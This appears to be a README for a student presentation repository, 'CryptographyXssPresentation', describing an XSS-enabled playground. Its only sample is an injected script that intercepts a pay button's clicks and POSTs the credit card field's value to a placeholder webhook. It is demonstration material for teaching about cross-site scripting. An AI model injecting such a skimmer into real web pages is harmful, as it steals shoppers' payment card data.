# CryptographyXssPresentation
## An XSS enabled playground

#

Sample Script:
```javascript
<p><script>
    var payBtn = document.getElementById("payBtn");

    payBtn.addEventListener("click", function(event)
    {
        event.preventDefault();
        
        var creditCard = document.getElementById("creditInput");
        const request = new XMLHttpRequest();
        request.open("POST", "Some Webhook");
        request.setRequestHeader('Content-type', 'application/json');
        const params = {
            content: creditCard.value
        }
        request.send(JSON.stringify(params));
    })
</script>
```